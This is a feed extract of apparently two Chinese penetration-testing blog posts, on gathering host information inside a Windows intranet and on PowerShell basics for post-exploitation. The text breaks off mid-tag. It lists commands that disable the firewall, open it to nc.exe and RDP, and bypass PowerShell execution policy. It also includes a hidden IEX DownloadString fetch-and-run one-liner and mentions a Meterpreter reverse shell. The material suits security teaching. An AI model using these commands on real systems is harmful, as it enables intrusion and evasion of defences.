title="查询计划任务"></a>查询计划任务</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /fo LIST /v</span><br></pre></td></tr></table></figure><p><img src="/2020/02/27/内网信息收集之本机信息收集/10.png" alt=""></p><h3 id="查询主机开机时间"><a href="#查询主机开机时间" class="headerlink" title="查询主机开机时间"></a>查询主机开机时间</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net statistics workstation</span><br></pre></td></tr></table></figure><p><img src="/2020/02/27/内网信息收集之本机信息收集/11.png" alt=""></p><h3 id="查询用户列表"><a href="#查询用户列表" class="headerlink" title="查询用户列表"></a>查询用户列表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure><p><img src="/2020/02/27/内网信息收集之本机信息收集/12.png" alt=""></p><p>通过分析本机用户列表，可以得出内网机子的命名规则，特别是个人及其的名称，可以用来推测整个域的用户命名方式。</p><p>通过以下命令获取本地管理员（通常包含域用户）信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators</span><br></pre></td></tr></table></figure><p>可以看到，本地管理员有两个用户和一个组，默认Domain Admins组中为域内机器的本地管理员用户。在真实环境中，为了方便管理，会有域用户被添加为域机器的本地管理员用户。如图：</p><p><img src="/2020/02/27/内网信息收集之本机信息收集/13.png" alt=""></p><p>执行如下命令查看当前在线用户：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query user || qwinsta</span><br></pre></td></tr></table></figure><p><img src="/2020/02/27/内网信息收集之本机信息收集/14.png" alt=""></p><h3 id="列出或断开本地计算机与所连接的客户端之间的会话"><a href="#列出或断开本地计算机与所连接的客户端之间的会话" class="headerlink" title="列出或断开本地计算机与所连接的客户端之间的会话"></a>列出或断开本地计算机与所连接的客户端之间的会话</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net session</span><br></pre></td></tr></table></figure><h3 id="查询端口列表"><a href="#查询端口列表" class="headerlink" title="查询端口列表"></a>查询端口列表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure><p><img src="/2020/02/27/内网信息收集之本机信息收集/15.png" alt=""></p><h3 id="查询补丁列表"><a href="#查询补丁列表" class="headerlink" title="查询补丁列表"></a>查询补丁列表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure><p>需要注意系统的版本、位数、域、补丁信息及更新频率等。域内主机的补丁通常是批量安装的，通过查看本机补丁列表，就可以找到未打补丁的漏洞。</p><p><img src="/2020/02/27/内网信息收集之本机信息收集/16.png" alt=""></p><p>使用wmic命令查看安装在系统中的补丁，包括补丁的名称、描述、ID、安装时间等信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br></pre></td></tr></table></figure><p><img src="/2020/02/27/内网信息收集之本机信息收集/17.png" alt=""></p><h3 id="查询本机共享列表"><a href="#查询本机共享列表" class="headerlink" title="查询本机共享列表"></a>查询本机共享列表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net share</span><br></pre></td></tr></table></figure><p>该命令可查看本机共享列表和可访问的域共享列表（域共享在很多时候是相同的）：</p><p><img src="/2020/02/27/内网信息收集之本机信息收集/18.png" alt=""></p><p>利用wmic命令查找共享列表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic share get name,path,status</span><br></pre></td></tr></table></figure><p><img src="/2020/02/27/内网信息收集之本机信息收集/19.png" alt=""></p><h3 id="查询路由表及所有可用接口的ARP缓存表"><a href="#查询路由表及所有可用接口的ARP缓存表" class="headerlink" title="查询路由表及所有可用接口的ARP缓存表"></a>查询路由表及所有可用接口的ARP缓存表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">route print</span><br><span class="line">arp -a</span><br></pre></td></tr></table></figure><p><img src="/2020/02/27/内网信息收集之本机信息收集/20.png" alt=""></p><p><img src="/2020/02/27/内网信息收集之本机信息收集/21.png" alt=""></p><h3 id="查询防火墙相关配置"><a href="#查询防火墙相关配置" class="headerlink" title="查询防火墙相关配置"></a>查询防火墙相关配置</h3><h4 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h4><p>Windows Server 2003及之前的版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall set opmode disable</span><br></pre></td></tr></table></figure><p>Windows Server 2003之后的版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure><h4 id="查看防火墙配置"><a href="#查看防火墙配置" class="headerlink" title="查看防火墙配置"></a>查看防火墙配置</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall show config</span><br></pre></td></tr></table></figure><p><img src="/2020/02/27/内网信息收集之本机信息收集/22.png" alt=""></p><h4 id="修改防火墙配置"><a href="#修改防火墙配置" class="headerlink" title="修改防火墙配置"></a>修改防火墙配置</h4><p>Windows Server 2003及之前的版本，允许指定程序全部连接：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall add allowedprogram c:\nc.exe &quot;allow nc&quot; enable</span><br></pre></td></tr></table></figure><p>Windows Server 2003之后的版本，情况如下。</p><p>允许指定程序进入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name=&quot;pass nc&quot; dir=in action=allow program=&quot;C:\nc.exe&quot;</span><br></pre></td></tr></table></figure><p>允许指定程序退出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name=&quot;Allow nc&quot; dir=out action=allow program=&quot;C:\nc.exe&quot;</span><br></pre></td></tr></table></figure><p>允许3389端口放行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</span><br></pre></td></tr></table></figure><h4 id="自定义防火墙日志的储存位置"><a href="#自定义防火墙日志的储存位置" class="headerlink" title="自定义防火墙日志的储存位置"></a>自定义防火墙日志的储存位置</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall set currentprofile logging filename &quot;C:\windows\temp\fw.log&quot;</span><br></pre></td></tr></table></figure><h3 id="查询代理配置情况"><a href="#查询代理配置情况" class="headerlink" title="查询代理配置情况"></a>查询代理配置情况</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</span><br></pre></td></tr></table></figure><p>这里我本地是没开代理端口的：</p><p><img src="/2020/02/27/内网信息收集之本机信息收集/24.png" alt=""></p><h3 id="查询并开启远程连接服务"><a href="#查询并开启远程连接服务" class="headerlink" title="查询并开启远程连接服务"></a>查询并开启远程连接服务</h3><h4 id="查看远程连接端口"><a href="#查看远程连接端口" class="headerlink" title="查看远程连接端口"></a>查看远程连接端口</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Reg query &quot;hkey_local_machine\system\currentcontrolset\control\terminal server\winstations\RDP-Tcp&quot; /v portnumber</span><br></pre></td></tr></table></figure><p>在命令行环境中执行注册表查询语句，连接的端口为0xd3d，转换后为3389：</p><p><img src="/2020/02/27/内网信息收集之本机信息收集/23.png" alt=""></p><h4 id="在Windows-Server-2003中开启3389端口"><a href="#在Windows-Server-2003中开启3389端口" class="headerlink" title="在Windows Server 2003中开启3389端口"></a>在Windows Server 2003中开启3389端口</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic path win32_terminalservicesetting where (__CLASS !=&quot;&quot;)  call setallowtsconnections 1</span><br></pre></td></tr></table></figure><h4 id="在Windows-Server-2008和Windows-Server-2012中开启3389端口"><a href="#在Windows-Server-2008和Windows-Server-2012中开启3389端口" class="headerlink" title="在Windows Server 2008和Windows Server 2012中开启3389端口"></a>在Windows Server 2008和Windows Server 2012中开启3389端口</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 1</span><br><span class="line"></span><br><span class="line">wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName=&apos;RDP-Tcp&apos;) call setuserauthenticationrequired 1</span><br><span class="line"></span><br><span class="line">reg add &quot;HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER&quot; /v fSingleSessionPerUser /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure><h2 id="0x02-自动收集信息"><a href="#0x02-自动收集信息" class="headerlink" title="0x02 自动收集信息"></a>0x02 自动收集信息</h2><p>为了简化前面手动收集信息的操作，我们可以直接创建一个脚本文件来自动完成前面的信息查询等工作。这里推荐一个使用WMIC收集目标机器信息的脚本。</p><p>WMIC（Windows Management Instrumentation Command-Line，Windows管理工具命令行）是最有用的Windows命令行工具。在默认情况下，任何版本的Windows XP的低权限用户不能访问WMIC，Windows 7以上版本的低权限用户允许访问WMIC并执行相关操作。</p><p>下载地址：<a href="http://www.fuzzysecurity.com/scripts/files/wmic_info.rar" target="_blank" rel="noopener">http://www.fuzzysecurity.com/scripts/files/wmic_info.rar</a></p><p>我们可简单看下它的代码，其实就是执行一些wmic查询命令然后保存到html文件中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">for /f &quot;delims=&quot; %%A in (&apos;dir /s /b %WINDIR%\system32\*htable.xsl&apos;) do set &quot;var=%%A&quot;</span><br><span class="line"></span><br><span class="line">wmic process get CSName,Description,ExecutablePath,ProcessId /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic service get Caption,Name,PathName,ServiceType,Started,StartMode,StartName /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic USERACCOUNT list full /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic group list full /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic nicconfig where IPEnabled=&apos;true&apos; get Caption,DefaultIPGateway,Description,DHCPEnabled,DHCPServer,IPAddress,IPSubnet,MACAddress /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic volume get Label,DeviceID,DriveLetter,FileSystem,Capacity,FreeSpace /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic netuse list full /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic startup get Caption,Command,Location,User /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic PRODUCT get Description,InstallDate,InstallLocation,PackageCache,Vendor,Version /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic os get name,version,InstallDate,LastBootUpTime,LocalDateTime,Manufacturer,RegisteredUser,ServicePackMajorVersion,SystemDirectory /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic Timezone get DaylightName,Description,StandardName /format:&quot;%var%&quot; &gt;&gt; out.html</span><br></pre></td></tr></table></figure><p>执行该脚本后，会在本地生成一个HTML文件来保存结果：</p><p><img src="/2020/02/27/内网信息收集之本机信息收集/25.png" alt=""></p><h2 id="0x03-Empire下的主机信息收集"><a href="#0x03-Empire下的主机信息收集" class="headerlink" title="0x03 Empire下的主机信息收集"></a>0x03 Empire下的主机信息收集</h2><p>Empire是针对Windows系统的后渗透神器，包括了从stager生成、提权到渗透维持的一系列功能。</p><p>官网：<a href="http://www.powershellempire.com/" target="_blank" rel="noopener">http://www.powershellempire.com/</a></p><p>下面只做下笔记，就不自己折腾了。</p><p>Empire提供了用于收集主机信息的模块。输入如下命令即可查看本机用户、域组成员、密码设置时间、剪贴板内容、系统基本信息、网络适配器信息、共享信息等：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usemodule situational_awareness/host/winenum</span><br></pre></td></tr></table></figure><p>此外，situational_awareness/host/computerdetails模块几乎包含了系统中所有有用的信息，比如目标主机事件日志、应用程序控制策略日志，包括RDP登录信息、PowerShell脚本运行和保存的信息等。注意，该模块需要管理员权限运行。</p><h2 id="0x04-查询当前权限"><a href="#0x04-查询当前权限" class="headerlink" title="0x04 查询当前权限"></a>0x04 查询当前权限</h2><h3 id="查询当前权限"><a href="#查询当前权限" class="headerlink" title="查询当前权限"></a>查询当前权限</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br></pre></td></tr></table></figure><p>通过该命令，我们一般可以区分出当前用户是属于以下哪种用户：</p><ul><li>本地普通用户</li><li>本地管理员用户</li><li>域内用户</li></ul><p>在这三种情况下，如果当前内网中存在域，那么本地普通用户是查询不到内网域信息的，而只能查询本机相关信息，但是本机管理员用户和域内用户则可以查询域内信息。</p><p>其原理在于：域内的所有查询都是通过DC实现的（基于LDAP协议），而这个查询需要经过权限认证，所以只有域用户才拥有这个权限；当域用户执行查询命令时，会自动使用Kerberos协议进行认证，无须额外输入账号密码。</p><p>本地管理员Administrator权限可以直接提升为Ntauthority或System权限，因此在域中除了普通用户外，所有的机器都有一个机器用户（用户名是机器名加上“$”）。在本质上，机器的System用户对应的就是域里面的机器用户。所以，使用System权限可以运行域内的查询命令。</p><p>比如这里是hacker域内的testuser用户：</p><p><img src="/2020/02/27/内网信息收集之本机信息收集/26.png" alt=""></p><h3 id="获取域SID"><a href="#获取域SID" class="headerlink" title="获取域SID"></a>获取域SID</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /all</span><br></pre></td></tr></table></figure><p>可以看到当前域hacker的SID为S-1-5-21-554479669-3187065311-1765148423，域用户testuser的SID为S-1-5-21-554479669-3187065311-1765148423-1105：</p><p><img src="/2020/02/27/内网信息收集之本机信息收集/27.png" alt=""></p><h3 id="查询指定用户的详细信息"><a href="#查询指定用户的详细信息" class="headerlink" title="查询指定用户的详细信息"></a>查询指定用户的详细信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user xxx /domain</span><br></pre></td></tr></table></figure><p>输入该命令可以看到当前用户在本地组中有没有本地管理员权限，属于哪个域等。</p><p>这里看到testuser用户在本地组并没有本地管理员权限，在域中属于Domain Users组：</p><p><img src="/2020/02/27/内网信息收集之本机信息收集/28.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="内网渗透" scheme="https://www.mi1k7ea.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="渗透测试" scheme="https://www.mi1k7ea.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="内网渗透" scheme="https://www.mi1k7ea.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透之Windows PowerShell基础</title>
    <link href="https://www.mi1k7ea.com/2020/02/18/Windows-PowerShell%E5%9F%BA%E7%A1%80/"/>
    <id>https://www.mi1k7ea.com/2020/02/18/Windows-PowerShell基础/</id>
    <published>2020-02-18T13:51:31.000Z</published>
    <updated>2020-02-27T15:36:06.773Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>主要参考《内网安全攻防》。</p><p>更多PowerShell的内容可参考：<a href="https://www.pstips.net/powershell-online-tutorials" target="_blank" rel="noopener">https://www.pstips.net/powershell-online-tutorials</a></p><h2 id="0x01-PowerShell基本概念"><a href="#0x01-PowerShell基本概念" class="headerlink" title="0x01 PowerShell基本概念"></a>0x01 PowerShell基本概念</h2><p>Windows PowerShell是一种命令行外壳程序和脚本环境，可以看作是命令行提示符cmd.exe的扩展，其使命令行用户和脚本编写者可以利用.NET Framework的强大功能。只要可以在一台计算机上运行代码，就可以将PowerShell脚本文件（.ps1）下载到磁盘中执行（甚至无须将脚本文件写到磁盘中）。</p><p>PowerShell需要.NET环境的支持，同时支持.NET对象，其拥有以下特点：</p><ul><li>在Windows 7以上版本是默认安装的；</li><li>脚本可以在内存中运行，不需要写入磁盘；</li><li>几乎不会触发杀毒软件；</li><li>可远程执行；</li><li>目前很多工具都是局域PowerShell开发的；</li><li>使Windows脚本的执行更为容易；</li><li>cmd.exe的运行通常会被阻止，但PowerShell的运行通常不会被阻止；</li><li>可用于管理活动目录；</li></ul><p>通过以下两个命令都可以查看PowerShell的版本：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">PS E:\&gt; <span class="built_in">Get-Host</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Name             : ConsoleHost</span><br><span class="line">Version          : <span class="number">5.1</span>.<span class="number">18362.628</span></span><br><span class="line">InstanceId       : <span class="number">33</span>a7b882-<span class="number">5</span>b06-<span class="number">494</span>a-<span class="number">9577</span>-ed0f51a6e8ad</span><br><span class="line">UI               : System.Management.Automation.Internal.Host.InternalHostUserInterface</span><br><span class="line">CurrentCulture   : zh-CN</span><br><span class="line">CurrentUICulture : zh-CN</span><br><span class="line">PrivateData      : Microsoft.PowerShell.ConsoleHost+ConsoleColorProxy</span><br><span class="line">DebuggerEnabled  : True</span><br><span class="line">IsRunspacePushed : False</span><br><span class="line">Runspace         : System.Management.Automation.Runspaces.LocalRunspace</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PS E:\&gt; <span class="variable">$PSVersionTable</span>.PSVersion</span><br><span class="line"></span><br><span class="line">Major  Minor  Build  Revision</span><br><span class="line">-----  -----  -----  --------</span><br><span class="line"><span class="number">5</span>      <span class="number">1</span>      <span class="number">18362</span>  <span class="number">628</span></span><br></pre></td></tr></table></figure><h2 id="0x02-PowerShell脚本"><a href="#0x02-PowerShell脚本" class="headerlink" title="0x02 PowerShell脚本"></a>0x02 PowerShell脚本</h2><p>PowerShell脚本其实就是一个扩展名为”.ps1”的文件，其中包含一系列PowerShell命令，每个命令显示为独立的一行。</p><h3 id="脚本运行"><a href="#脚本运行" class="headerlink" title="脚本运行"></a>脚本运行</h3><p>运行PowerShell脚本需要输入绝对路径，比如<code>E:\test.ps1</code>。如果PowerShell脚本刚好在系统目录中，则只需要<code>.\test.ps1</code>执行即可，这和Linux上执行Shell脚本是一样的。</p><p>当然，PowerShell是分32位和64位的。在64位的Windows上，同时存在x64和x86两个版本的PowerShell，并且这两个版本的执行策略互不影响，即相互独立。</p><p>x64版本的PowerShell的配置文件在<code>%WinDir%\SysWOW64\WindowsPowerShell\v1.0\</code>目录下。</p><p>运行32位PowerShell脚本命令如下：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -NoP -NonI -W Hidden -Exec Bypass</span><br></pre></td></tr></table></figure><p>运行64位PowerShell脚本命令如下：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%WinDir%\SysWOW64\WindowsPowerShell\v1.<span class="number">0</span>\powershell.exe -NoP -NonI -W Hidden -Exec Bypass</span><br></pre></td></tr></table></figure><h3 id="执行策略"><a href="#执行策略" class="headerlink" title="执行策略"></a>执行策略</h3><p>为了防止使用者运行恶意脚本，PowerShell提供了一个执行策略。在默认情况下，这个执行策略被设置为“不能运行”。</p><p>如果PowerShell脚本不能运行，可以使用如下的cmdlet命令查询当前的执行策略：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS E:\&gt; <span class="built_in">Get-ExecutionPolicy</span></span><br><span class="line">Restricted</span><br></pre></td></tr></table></figure><p>这里看到是Restricted即限制不能执行的意思。我们看下执行策略的几个值：</p><ul><li>Restricted：脚本不能运行（默认设置）；</li><li>RemoteSigned：在本地创建的脚本可以运行，但不能运行网上下载的脚本（拥有数字证书的除外）；</li><li>AllSigned：仅当脚本由受信任的发布者签名时才能运行；</li><li>Unrestricted：允许所有脚本运行；</li></ul><p>可以使用下面的cmdlet命令设置PowerShell的执行策略：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS E:\&gt; <span class="built_in">Set-ExecutionPolicy</span> &lt;policy name&gt;</span><br></pre></td></tr></table></figure><h3 id="管道符"><a href="#管道符" class="headerlink" title="管道符"></a>管道符</h3><p>在PowerShell中也支持管道符<code>|</code>的使用。</p><p>管道的作用就是将一个命令的输出作为另一个命令的输入，两个命令之间用<code>|</code>连接。</p><h2 id="0x03-PowerShell常用命令与利用技巧"><a href="#0x03-PowerShell常用命令与利用技巧" class="headerlink" title="0x03 PowerShell常用命令与利用技巧"></a>0x03 PowerShell常用命令与利用技巧</h2><p>在Windows命令提示符即cmd.exe中输入<code>powershell</code>命令即可切入PowerShell命令行环境。也可以直接在当前目录Shift+右键&gt;在此处打开PowerShell窗口（win10）。其中输入help命令可以显示帮助菜单：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">E:\&gt;powershell</span><br><span class="line">Windows PowerShell</span><br><span class="line">版权所有 (C) Microsoft Corporation。保留所有权利。</span><br><span class="line"></span><br><span class="line">尝试新的跨平台 PowerShell https://aka.ms/pscore6</span><br><span class="line"></span><br><span class="line">PS E:\&gt; help</span><br><span class="line"></span><br><span class="line">主题</span><br><span class="line">Windows PowerShell 帮助系统</span><br><span class="line"></span><br><span class="line">简短说明</span><br><span class="line">显示有关 Windows PowerShell 的 cmdlet 及概念的帮助。</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><p>在PowerShell中，类似cmd命令的命令称为cmdlet命令。两者的命名规范一致，都采用“动词-名词”的方式，动词部分一般是Add、New、Get、Set、Remove等。命令的别名一般兼容Windows Command和Linux Shell。另外PowerShell命令不区分大小写。</p><p>几个常用命令：</p><p><img src="/2020/02/18/Windows-PowerShell基础/4.png" alt=""></p><p>几个常用的文件操作命令：</p><p><img src="/2020/02/18/Windows-PowerShell基础/3.png" alt=""></p><p>下面以文件操作为例：</p><ul><li>新建目录：New-ltem whitecellclub-ltemType Directory；</li><li>新建文件：New-ltem light.txt-ltemType File；</li><li>删除目录：Remove-ltem whitecellclub；</li><li>显示文本内容：Get-Content test.txt；</li><li>设置文本内容：Set-Content test.txt-Value ‘’hello,word! ‘’；</li><li>追加内容：Add-Content light.txt-Value ‘’i love you ‘’；</li><li>清除内容：Clear-Content test.txt</li></ul><h3 id="PowerSploit——后渗透测试框架"><a href="#PowerSploit——后渗透测试框架" class="headerlink" title="PowerSploit——后渗透测试框架"></a>PowerSploit——后渗透测试框架</h3><p>PowerSploit是一款基于PowerShell的后渗透测试框架，其中包含很多PowerShell脚本，主要用于渗透测试中的信息收集、权限提升、权限维持。</p><p>项目地址：<a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit</a></p><p>它包含以下几个模块：</p><ul><li>CodeExecution：在目标机器执行代码；</li><li>ScriptModification：修改或准备脚本以在受感染的计算机上执行；</li><li>Persistence：向PowerShell脚本添加持久性功能；</li><li>AntivirusBypass：使PowerShell绕过防病毒；</li><li>Exfiltration：窃取数据；</li><li>Mayhem：使用PowerShell引起一般的混乱；</li><li>Privesc：帮助提升目标特权的工具；</li><li>Recon：在渗透测试的侦察阶段提供帮助的工具；</li></ul><h3 id="利用技巧"><a href="#利用技巧" class="headerlink" title="利用技巧"></a>利用技巧</h3><p>由前面知道，要想运行PowerShell脚本，必须使用管理员权限将执行策略从Restricted改为Unrestricted。</p><h4 id="Bypass本地权限并执行"><a href="#Bypass本地权限并执行" class="headerlink" title="Bypass本地权限并执行"></a>Bypass本地权限并执行</h4><p>将PowerShell脚本文件test.ps1上传至目标服务器。在命令行环境下，执行如下命令，绕过安全策略，在目标服务器本地执行该脚本：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerShell.exe -ExecutionPolicy Bypass -File test.ps1</span><br></pre></td></tr></table></figure><p>示例：</p><p><img src="/2020/02/18/Windows-PowerShell基础/1.png" alt=""></p><p>在实际的内网渗透中，将PowerSploit中Privesc模块的<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1" target="_blank" rel="noopener">PowerUp.ps1脚本</a>上传到目标服务器中，在目标本地执行脚本文件，命令如下：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -exec bypass -Command <span class="string">"&amp; &#123;Import-Module E:\PowerUp.ps1; Invoke-AllChecks&#125;"</span></span><br></pre></td></tr></table></figure><p><img src="/2020/02/18/Windows-PowerShell基础/2.png" alt=""></p><p>这里PowerUp旨在成为依赖错误配置的常见Windows特权升级向量的交换所。运行Invoke-AllChecks将输出所有可识别的漏洞以及任何滥用功能的规范。换句话说，Invoke-AllChecks函数将检查目标主机的攻击向量以进行权限提升</p><h4 id="从网站服务器中下载脚本，Bypass本地权限并隐藏执行"><a href="#从网站服务器中下载脚本，Bypass本地权限并隐藏执行" class="headerlink" title="从网站服务器中下载脚本，Bypass本地权限并隐藏执行"></a>从网站服务器中下载脚本，Bypass本地权限并隐藏执行</h4><p>下载脚本的命令如下：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerShell.exe -ExecutionPolicy Bypass-WindowStyle Hidden-NoProfile-NonI IEX(New-ObjectNet.WebClient).DownloadString(<span class="string">"xxx.ps1"</span>);[Parameters]</span><br></pre></td></tr></table></figure><p>几个常用参数说明如下：</p><p>-ExecutionPolicy Bypass（-Exec Bypass）：绕过执行安全策略，这个参数非常重要。在默认 情况下，PowerShell 的安全策略规定了 PowerShell 不允许运行命令和文件。通过设置这个 参数，可以绕过任意安全保护规则。在渗透测试中，通常每次运行 PowerShell 脚本时都要 使用这个参数；</p><ul><li>-WindowStyle Hidden（-W Hidden）：隐藏窗口；</li><li>-Nonlnteractive（-NonI）：非交互模式。PowerShell不为用户提供交互的提示；</li><li>-NoProfile（-NoP）：PowerShell控制台不加载当前用户的配置文件；</li><li>-noexit：执行后不退出Shell。这在使用键盘记录等脚本时非常重要；</li><li>-NoLogo：启动不显示版权标志的PowerShell；</li></ul><p>这里使用PowerSploit中CodeExecution模块中<a href="https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1" target="_blank" rel="noopener">Invoke-Shellcode.ps1</a>脚本在目标机器上执行Meterpreter Shell。</p><p>这里我们需要知道使用什么参数，直接看源码了解如何调用反向HTTPS Meterpreter Shell：</p><p><img 